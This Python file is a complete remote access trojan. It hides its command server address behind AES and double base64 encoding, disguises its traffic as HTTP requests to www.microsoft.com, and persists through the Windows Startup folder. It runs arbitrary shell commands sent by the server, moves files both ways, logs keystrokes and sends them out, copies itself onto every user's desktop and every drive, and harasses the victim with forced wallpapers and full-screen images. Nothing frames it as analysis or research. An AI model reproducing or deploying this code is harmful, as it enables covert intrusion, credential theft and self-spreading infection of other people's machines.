import socket
import subprocess
import os
import time
import shutil
import sys
import json
import threading
import random
import string
import urllib.request
import tempfile

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    import subprocess
    import sys as _sys
    _sys.check_call([_sys.executable, "-m", "pip", "install", "pycryptodome"])
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad

_SECRET_KEY_B64 = "UmF0S2V5Rm9yUmF0UHJvamVrdHIxNzk1MTM1MTkuKDIyMzMpWzEyOV["
import base64 as _base64
try:
    _SECRET_KEY_RAW = _base64.b64decode(_SECRET_KEY_B64)
except Exception:
    _MASK = 0x55
    _MASKED_KEY = [7, 52, 33, 30, 48, 44, 19, 58, 39, 7, 52, 33, 5, 39, 58, 63, 48, 62, 33, 39, 100, 98, 108, 96, 100, 102, 96, 100, 108, 123, 125, 103, 103, 102, 102, 124, 14, 100, 103, 108, 14]
    try:
        _SECRET_KEY_RAW = bytes([(b ^ _MASK) & 0xFF for b in _MASKED_KEY])
    except Exception:
        _SECRET_KEY_RAW = b"test"
import hashlib
DERIVED_KEY = hashlib.sha256(_SECRET_KEY_RAW if isinstance(_SECRET_KEY_RAW, (bytes, bytearray)) else str(_SECRET_KEY_RAW).encode()).digest()


def encrypt(data: bytes) -> bytes:
    cipher = AES.new(DERIVED_KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data, AES.block_size))
    return base64.b64encode(cipher.iv + ct_bytes)

def decrypt(data: bytes) -> bytes:
    raw = base64.b64decode(data)
    iv = raw[:AES.block_size]
    ct = raw[AES.block_size:]
    cipher = AES.new(DERIVED_KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size)

import base64

try:
    import tkinter as tk
    from tkinter import messagebox
    TKINTER_AVAILABLE = True
except Exception:
    TKINTER_AVAILABLE = False
try:
    from PIL import Image, ImageTk
    PIL_AVAILABLE = True
except Exception:
    PIL_AVAILABLE = False

def random_path():
    return "/" + "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 16))) + ".html"

def random_headers():
    headers = [
        "Accept-Encoding: gzip, deflate",
        "Cache-Control: no-cache",
        "Pragma: no-cache",
        "Referer: https://www.google.com/",
        "X-Requested-With: XMLHttpRequest",
        "DNT: 1",
        "Upgrade-Insecure-Requests: 1",
        "Sec-Fetch-Mode: navigate",
        "Sec-Fetch-Site: cross-site",
        "Sec-Fetch-User: ?1",
        "TE: trailers",
    ]
    return "\r\n".join(random.sample(headers, k=random.randint(2, 6)))

def http_send(sock, data, pad=True):
    crypt = False
    if isinstance(data, tuple) and len(data) == 2 and isinstance(data[1], bool):
        payload, crypt = data
        data = payload

    if isinstance(data, bytes):
        body = data
        length = len(body)
    else:
        body = data.encode()
        length = len(body)

    if crypt:
        body = encrypt(body)

    path = random_path()
    extra_headers = random_headers()
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        "Host: www.microsoft.com\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "Accept: */*\r\n"
        f"{extra_headers}\r\n"
        "Connection: keep-alive\r\n"
        f"Content-Length: {len(body)}\r\n"
    )
    if crypt:
        headers += "crypt=true\r\n"
    headers += "\r\n"
    request = headers.encode() + body
    sock.sendall(request)

def http_recv(sock, as_bytes=False):
    response = b""
    while b"\r\n\r\n" not in response:
        response += sock.recv(4096)
    header, rest = response.split(b"\r\n\r\n", 1)
    content_length = 0
    for line in header.split(b"\r\n"):
        if line.lower().startswith(b"content-length:"):
            content_length = int(line.split(b":")[1].strip())
            break
    while len(rest) < content_length:
        rest += sock.recv(4096)
    data = rest[:content_length]
    header_l = header.lower()
    if b"crypt=true" in header_l or b"crypt: true" in header_l:
        try:
            data = decrypt(data)
        except Exception:
            pass

    if as_bytes:
        return data
    else:
        try:
            return data.decode(errors="ignore")
        except Exception:
            return ""

def upload(sock, filename):
    if not os.path.isfile(filename):
        http_send(sock, f"UPLOAD ERROR: Datei '{filename}' nicht gefunden")
        return
    try:
        with open(filename, "rb") as f:
            data = f.read()
        http_send(sock, data)
    except Exception as e:
        http_send(sock, f"UPLOAD ERROR: {e}")

def download(sock, filename):
    if not os.path.isfile(filename):
        http_send(sock, f"DOWNLOAD ERROR: Datei '{filename}' nicht gefunden")
        return
    try:
        with open(filename, "rb") as f:
            data = f.read()
        http_send(sock, data)
    except Exception as e:
        http_send(sock, f"DOWNLOAD ERROR: {e}")

def copy_to_startup():
    startup = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
    script_path = os.path.abspath(sys.argv[0])
    dest_path = os.path.join(startup, os.path.basename(script_path))
    if script_path != dest_path:
        try:
            shutil.copyfile(script_path, dest_path)
        except Exception:
            pass

def copy_file_to_startup(filename):
    try:
        startup = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
        dest_path = os.path.join(startup, os.path.basename(filename))
        shutil.copyfile(filename, dest_path)
        return f"Copied {filename} to Startup"
    except Exception as e:
        return f"Copy to Startup failed: {e}"

def ensure_driverdetails_folder():
    roaming = os.environ.get("APPDATA")
    folder = os.path.join(roaming, "driverdetails")
    if not os.path.exists(folder):
        os.makedirs(folder)
    return folder

def upload_to_driverdetails(filename):
    try:
        folder = ensure_driverdetails_folder()
        dest_path = os.path.join(folder, os.path.basename(filename))
        shutil.copyfile(filename, dest_path)
        return f"Uploaded {filename} to {dest_path}"
    except Exception as e:
        return f"Upload to driverdetails failed: {e}"

def worm_spread():
    results = []
    script_path = os.path.abspath(sys.argv[0])
    try:
        users_dir = os.path.join(os.environ.get("SYSTEMDRIVE", "C:"), "Users")
        for user in os.listdir(users_dir):
            desktop = os.path.join(users_dir, user, "Desktop")
            if os.path.isdir(desktop):
                dest = os.path.join(desktop, os.path.basename(script_path))
                try:
                    shutil.copyfile(script_path, dest)
                    results.append(f"Copied to {dest}")
                except Exception as e:
                    results.append(f"Failed desktop {dest}: {e}")
    except Exception as e:
        results.append(f"Desktop spread error: {e}")
    try:
        for drive in [f"{chr(d)}:\\" for d in range(65, 91)]:
            if os.path.exists(drive):
                dest = os.path.join(drive, os.path.basename(script_path))
                try:
                    shutil.copyfile(script_path, dest)
                    results.append(f"Copied to {dest}")
                except Exception as e:
                    results.append(f"Failed drive {dest}: {e}")
    except Exception as e:
        results.append(f"Drive spread error: {e}")
    return "\n".join(results)

def list_dir(path):
    try:
        items = []
        for name in os.listdir(path):
            full = os.path.join(path, name)
            items.append({
                "name": name,
                "path": full,
                "is_dir": os.path.isdir(full)
            })
        return json.dumps(items)
    except Exception as e:
        return json.dumps([])

def background_execute(script, sock):
    try:
        subprocess.Popen([sys.executable, script], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        http_send(sock, f"Started {script} in background")
    except Exception as e:
        http_send(sock, f"BGEXECUTE ERROR: {e}")

pause_event = threading.Event()
pause_event.set()  

def pause_for(seconds):
    pause_event.clear()
    time.sleep(seconds)
    pause_event.set()

chat_event = threading.Event()
chat_event.clear()
chat_input_thread = None

def client_chat_input(sock, event):
    try:
        while event.is_set():
            try:
                line = input("Chat (to server): ")
            except EOFError:
                line = "/end"
            if not event.is_set():
                break
            if line.strip() == "/end":
                try:
                    http_send(sock, "chat end")
                except Exception:
                    pass
                event.clear()
                break
            try:
                http_send(sock, f"chatmsg {line}")
            except Exception:
                event.clear()
                break
    finally:
        event.clear()

def set_wallpaper(sock, url):
    try:
        fd, tmp = tempfile.mkstemp(suffix=os.path.splitext(url)[1] or ".jpg")
        os.close(fd)
        urllib.request.urlretrieve(url, tmp)

        if os.name == "nt":
            import ctypes
            SPI_SETDESKWALLPAPER = 20
            result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, tmp, 3)
            if result:
                http_send(sock, "SETWALLPAPER OK: Wallpaper changed")
            else:
                http_send(sock, "SETWALLPAPER ERROR: Failed to set wallpaper")
        else:
            http_send(sock, "SETWALLPAPER ERROR: Unsupported OS")
    except Exception as e:
        http_send(sock, f"SETWALLPAPER ERROR: {e}")
    finally:
        if os.path.exists(tmp):
            def remove_later(path):
                time.sleep(10)
                try:
                    os.remove(path)
                except Exception:
                    pass
            threading.Thread(target=remove_later, args=(tmp,), daemon=True).start()

keylogger_thread = None
keylogger_running = threading.Event()
keylogger_file = None

def keylogger_start():
    global keylogger_thread, keylogger_file
    if keylogger_thread and keylogger_thread.is_alive():
        return "Keylogger already running"
    try:
        keylogger_file = os.path.join(ensure_driverdetails_folder(), "keylog.txt")
        keylogger_running.set()
        keylogger_thread = threading.Thread(target=keylogger_capture, daemon=True)
        keylogger_thread.start()
        return "Keylogger started"
    except Exception as e:
        return f"Keylogger start error: {e}"

def keylogger_stop():
    global keylogger_running
    if not keylogger_running.is_set():
        return "Keylogger is not running"
    keylogger_running.clear()
    return "Keylogger stopped"

def keylogger_capture():
    try:
        import pynput.keyboard
        def on_press(key):
            try:
                with open(keylogger_file, "a", encoding="utf-8") as f:
                    f.write(f"{key.char}")
            except AttributeError:
                with open(keylogger_file, "a", encoding="utf-8") as f:
                    f.write(f"[{key}]")
        with pynput.keyboard.Listener(on_press=on_press) as listener:
            while keylogger_running.is_set():
                listener.join(0.1)
    except Exception:
        pass

def keylogger_dump(sock):
    global keylogger_file
    if not keylogger_file or not os.path.exists(keylogger_file):
        http_send(sock, "Keylogger dump error: No log file found")
        return
    try:
        with open(keylogger_file, "rb") as f:
            data = f.read()
        http_send(sock, data)
    except Exception as e:
        http_send(sock, f"Keylogger dump error: {e}")

def keylogger_downloadfolder(sock):
    try:
        folder = ensure_driverdetails_folder()
        if not os.path.exists(folder):
            http_send(sock, "Keylogger folder error: No folder found")
            return
        for root, _, files in os.walk(folder):
            for file in files:
                file_path = os.path.join(root, file)
                http_send(sock, f"upload {file}")
                with open(file_path, "rb") as f:
                    http_send(sock, f.read())
        shutil.rmtree(folder)
        http_send(sock, "Keylogger folder sent and deleted")
    except Exception as e:
        http_send(sock, f"Keylogger folder error: {e}")

def handle_wallpapertroll(sock):
    try:
        filename = "wallpaper.png"
        folder = ensure_driverdetails_folder()
        filepath = os.path.join(folder, filename)
        

        http_send(sock, f"download {filename}")
        
        with open(filepath, "wb") as f:
            data = http_recv(sock, as_bytes=True)
            if not data:
                http_send(sock, "WALLPAPERTROLL ERROR: No data received")
                return
            f.write(data)
        
        if os.name == "nt":
            import ctypes
            SPI_SETDESKWALLPAPER = 20
            result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, filepath, 3)
            if result:
                http_send(sock, "WALLPAPERTROLL OK: Wallpaper set")
            else:
                http_send(sock, "WALLPAPERTROLL ERROR: Failed to set wallpaper")
        else:
            http_send(sock, "WALLPAPERTROLL ERROR: Unsupported OS")
    except Exception as e:
        http_send(sock, f"WALLPAPERTROLL ERROR: {e}")

def multiimage(sock, url, count):
    try:
        count = int(count)
        if count <= 0:
            http_send(sock, "MULTIIMAGE ERROR: Count must be greater than 0")
            return

        fd, tmp = tempfile.mkstemp(suffix=os.path.splitext(url)[1] or ".jpg")
        os.close(fd)
        try:
            urllib.request.urlretrieve(url, tmp)
        except Exception as e:
            http_send(sock, f"MULTIIMAGE ERROR: Failed to download image: {e}")
            return

        for _ in range(count):
            if TKINTER_AVAILABLE and PIL_AVAILABLE:
                try:
                    root = tk.Tk()
                    root.attributes("-fullscreen", True)
                    root.configure(background='black')
                    img = Image.open(tmp)
                    screen_w = root.winfo_screenwidth()
                    screen_h = root.winfo_screenheight()
                    img_ratio = img.width / img.height
                    screen_ratio = screen_w / screen_h
                    if img_ratio > screen_ratio:
                        new_w = screen_w
                        new_h = int(screen_w / img_ratio)
                    else:
                        new_h = screen_h
                        new_w = int(screen_h * img_ratio)
                    img = img.resize((new_w, new_h), Image.ANTIALIAS)
                    tk_img = ImageTk.PhotoImage(img)
                    lbl = tk.Label(root, image=tk_img, bg='black')
                    lbl.pack(expand=True)
                    def close(event=None):
                        root.destroy()
                    root.bind("<Escape>", close)
                    root.bind("<Button-1>", close)
                    threading.Thread(target=root.mainloop, daemon=True).start()
                except Exception:
                    pass
            else:
                try:
                    if os.name == "nt":
                        os.startfile(tmp)
                    else:
                        opener = shutil.which("xdg-open") or shutil.which("open")
                        if opener:
                            subprocess.Popen([opener, tmp])
                except Exception:
                    pass

        http_send(sock, f"MULTIIMAGE OK: Opened image {count} times")
    except Exception as e:
        http_send(sock, f"MULTIIMAGE ERROR: {e}")
    finally:
        if os.path.exists(tmp):
            def remove_later(path):
                time.sleep(10)
                try:
                    os.remove(path)
                except Exception:
                    pass
            threading.Thread(target=remove_later, args=(tmp,), daemon=True).start()

def run_rat(server_ip, server_port):
    copy_to_startup()
    global chat_event, chat_input_thread
    while True:
        if not pause_event.is_set():
            time.sleep(1)
            continue
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server_ip, server_port))
            last_keepalive = time.time()
            while pause_event.is_set():
                if time.time() - last_keepalive > 30:
                    http_send(s, "GET /keepalive HTTP/1.1\r\nHost: www.microsoft.com\r\n\r\n")
                    last_keepalive = time.time()
                try:
                    s.settimeout(1)
                    data = http_recv(s)
                    s.settimeout(None)
                except socket.timeout:
                    continue
                if not data:
                    break
                if data.lower() == "exit":
                    break
                elif data == "chat start":
                    if not chat_event.is_set():
                        chat_event.set()
                        chat_input_thread = threading.Thread(target=client_chat_input, args=(s, chat_event), daemon=True)
                        chat_input_thread.start()
                        http_send(s, "chat OK: client ready")
                elif data == "chat end":
                    if chat_event.is_set():
                        chat_event.clear()
                    if chat_input_thread is not None:
                        try:
                            chat_input_thread.join(timeout=1)
                        except Exception:
                            pass
                    http_send(s, "chat ended")
                elif data.startswith("chatmsg "):
                    msg = data[len("chatmsg "):]
                    try:
                        print(f"\n[Server] {msg}")
                    except Exception:
                        pass
                else:
                    if not data:
                        break
                    if data.lower() == "exit":
                        break
                    elif data.startswith("clientpause "):
                        try:
                            seconds = int(data[len("clientpause "):].strip())
                            http_send(s, f"Client paused for {seconds} seconds")
                            s.close()  
                            pause_for(seconds)
                            break  
                        except Exception as e:
                            http_send(s, f"CLIENTPAUSE ERROR: {e}")
                    elif data.lower() == "resume":
                        pause_event.set()
                        http_send(s, "Client resumed")
                    elif data.startswith("clientpauseall "):
                        try:
                            seconds = int(data[len("clientpauseall "):].strip())
                            http_send(s, f"Client paused for {seconds} seconds (all)")
                            s.close()
                            pause_for(seconds)
                            break
                        except Exception as e:
                            http_send(s, f"CLIENTPAUSEALL ERROR: {e}")
                    elif data.lower() == "resumeall":
                        pause_event.set()
                        http_send(s, "Client resumed (all)")
                    elif data.startswith("ls "):
                        path = data[3:].strip()
                        result = list_dir(path)
                        http_send(s, result)
                    elif data.startswith("cd "):
                        try:
                            os.chdir(data[3:])
                            http_send(s, f"Changed directory to {os.getcwd()}")
                        except Exception as e:
                            http_send(s, str(e))
                    elif data.startswith("download "):
                        filename = data[9:]
                        upload(s, filename)
                    elif data.startswith("upload "):
                        filename = data[7:]
                        download(s, filename)
                        http_send(s, f"Uploaded {filename}")
                    elif data.startswith("copytostartup "):
                        filename = data[len("copytostartup "):].strip()
                        result = copy_file_to_startup(filename)
                        http_send(s, result)
                    elif data.lower().startswith("worm"):
                        result = worm_spread()
                        http_send(s, result)
                    elif data.startswith("execute "):
                        script = data[len("execute "):].strip()
                        try:
                            output = subprocess.check_output([sys.executable, script], stderr=subprocess.STDOUT)
                            http_send(s, output.decode(errors="ignore"))
                        except Exception as e:
                            http_send(s, f"EXECUTE ERROR: {e}")
                    elif data.startswith("uploadtofolder "):
                        filename = data[len("uploadtofolder "):].strip()
                        result = upload_to_driverdetails(filename)
                        http_send(s, result)
                    elif data.startswith("command "):
                        shellcmd = data[len("command "):].strip()
                        try:
                            output = subprocess.check_output(shellcmd, shell=True, stderr=subprocess.STDOUT)
                            http_send(s, output.decode(errors="ignore"), pad=False)
                        except Exception as e:
                            http_send(s, str(e), pad=False)
                    elif data.startswith("cat "):
                        filename = data[len("cat "):].strip()
                        try:
                            with open(filename, "r", encoding="utf-8", errors="ignore") as f:
                                content = f.read()
                            http_send(s, content)
                        except Exception as e:
                            http_send(s, f"CAT ERROR: {e}")
                    elif data.startswith("bgexecute "):
                        script = data[len("bgexecute "):].strip()
                        t = threading.Thread(target=background_execute, args=(script, s), daemon=True)
                        t.start()
                    elif data.startswith("messagebox "):
                        msg = data[len("messagebox "):].strip()
                        try:
                            if TKINTER_AVAILABLE:
                                try:
                                    root = tk.Tk()
                                    root.withdraw()
                                    messagebox.showinfo("Nachricht", msg)
                                    root.destroy()
                                    http_send(s, "MESSAGE OK")
                                except Exception:
                                    print(f"[MESSAGE] {msg}")
                                    http_send(s, "MESSAGE SHOWN (fallback)")
                            else:
                                if os.name == "nt":
                                    try:
                                        import ctypes
                                        ctypes.windll.user32.MessageBoxW(0, msg, "Message", 0)
                                        http_send(s, "MESSAGE OK (ctypes)")
                                    except Exception:
                                        print(f"[MESSAGE] {msg}")
                                        http_send(s, "MESSAGE SHOWN (fallback)")
                                else:
                                    print(f"[MESSAGE] {msg}")
                                    http_send(s, "MESSAGE SHOWN (console)")
                        except Exception as e:
                            http_send(s, f"MESSAGE ERROR: {e}")
                    elif data.startswith("showphoto "):
                        url = data[len("showphoto "):].strip()
                        try:
                            show_photo_fullscreen(s, url)
                        except Exception as e:
                            http_send(s, f"SHOWPHOTO ERROR: {e}")
                    elif data.startswith("setwallpaper "):
                        url = data[len("setwallpaper "):].strip()
                        set_wallpaper(s, url)
                    elif data.lower() == "keylogger start":
                        result = keylogger_start()
                        http_send(s, result)
                    elif data.lower() == "keylogger stop":
                        result = keylogger_stop()
                        http_send(s, result)
                    elif data.lower() == "keylogger dump":
                        keylogger_dump(s)
                    elif data.lower() == "keylogger downloadfolder":
                        keylogger_downloadfolder(s)
                    elif data.lower() == "wallpapertroll":
                        handle_wallpapertroll(s)
                    elif data.startswith("multiimage "):
                        try:
                            _, url, count = data.split(" ", 2)
                            multiimage(s, url, count)
                        except ValueError:
                            http_send(s, "MULTIIMAGE ERROR: Invalid arguments. Use 'multiimage <url> <count>'")
                    elif data.startswith("times "):
                        try:
                            parts = data[len("times "):].rsplit(" ", 1)
                            command = parts[0].strip()
                            count = int(parts[1].strip())
                            if count <= 0:
                                http_send(s, "TIMES ERROR: Count must be greater than 0")
                                continue
                            for _ in range(count):
                                try:
                                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                                    http_send(s, output.decode(errors="ignore"))
                                except Exception as e:
                                    http_send(s, f"TIMES ERROR: {e}")
                                time.sleep(0.5)
                            http_send(s, f"TIMES OK: Executed '{command}' {count} times")
                        except Exception as e:
                            http_send(s, f"TIMES ERROR: {e}")
                    else:
                        try:
                            output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
                            http_send(s, output.decode(errors="ignore"))
                        except Exception as e:
                            http_send(s, str(e))
            s.close()
        except Exception:
            time.sleep(10)
            continue
        except Exception:
            ip = "202.92.215.40"

        run_rat(ip, 80)

def show_photo_fullscreen(sock, source):
    tmp = None
    try:
        if source.lower().startswith("http://") or source.lower().startswith("https://"):
            fd, tmp = tempfile.mkstemp(suffix=os.path.splitext(source)[1] or ".jpg")
            os.close(fd)
            try:
                urllib.request.urlretrieve(source, tmp)
            except Exception as e:
                http_send(sock, f"SHOWPHOTO ERROR: download failed: {e}")
                try:
                    os.remove(tmp)
                except Exception:
                    pass
                return
        else:
            if os.path.isfile(source):
                tmp = source
            else:
                http_send(sock, f"SHOWPHOTO ERROR: File not found: {source}")
                return

        if TKINTER_AVAILABLE and PIL_AVAILABLE:
            try:
                root = tk.Tk()
                root.attributes("-fullscreen", True)
                root.configure(background='black')
                img = Image.open(tmp)
                screen_w = root.winfo_screenwidth()
                screen_h = root.winfo_screenheight()
                img_ratio = img.width / img.height
                screen_ratio = screen_w / screen_h
                if img_ratio > screen_ratio:
                    new_w = screen_w
                    new_h = int(screen_w / img_ratio)
                else:
                    new_h = screen_h
                    new_w = int(screen_h * img_ratio)
                img = img.resize((new_w, new_h), Image.ANTIALIAS)
                tk_img = ImageTk.PhotoImage(img)
                lbl = tk.Label(root, image=tk_img, bg='black')
                lbl.pack(expand=True)
                def close(event=None):
                    root.destroy()
                root.bind("<Escape>", close)
                root.bind("<Button-1>", close)
                http_send(sock, "SHOWPHOTO OK: opened fullscreen (Esc to close)")
                root.mainloop()
                http_send(sock, "SHOWPHOTO CLOSED")
                return
            except Exception as e:
                pass
 
        try:
            if os.name == "nt":
                os.startfile(tmp)
                http_send(sock, "SHOWPHOTO OPENED (system viewer)")
            else:
                opener = shutil.which("xdg-open") or shutil.which("open")
                if opener:
                    subprocess.Popen([opener, tmp])
                    http_send(sock, "SHOWPHOTO OPENED (system viewer)")
                else:
                    http_send(sock, "SHOWPHOTO ERROR: no system viewer found")
        except Exception as e:
            http_send(sock, f"SHOWPHOTO ERROR: {e}")
    finally:
        if tmp and source.lower().startswith("http") and os.path.exists(tmp):
            def remove_later(path):
                time.sleep(10)
                try:
                    os.remove(path)
                except Exception:
                    pass
            threading.Thread(target=remove_later, args=(tmp,), daemon=True).start()

if __name__ == "__main__":
    _ENCRYPTED_ADDR_DOUBLE_B64 = "Z1NTU3g0RnBER0VGRWtmYXVuWFRmZWg4azFmZFRvZHhpVVZrZHE4bTZBZlZnYzZaYkM1RUdGdFJEVWN0OHhQTA=="
    try:
        layer1 = base64.b64decode(_ENCRYPTED_ADDR_DOUBLE_B64)
        try:
            raw = base64.b64decode(layer1)
        except Exception:
            raw = layer1
        iv = raw[:AES.block_size]
        ct = raw[AES.block_size:]
        cipher = AES.new(DERIVED_KEY, AES.MODE_CBC, iv)
        from Crypto.Util.Padding import unpad
        addr = unpad(cipher.decrypt(ct), AES.block_size).decode()
        if ":" in addr:
            ip, port_s = addr.split(":", 1)
            try:
                port = int(port_s)
            except Exception:
                port = 99999
        else:
            ip = addr
            port = 99999
    except Exception:
        ip = "99999.99999.99999.99999"
        port = 99999

    run_rat(ip, port)
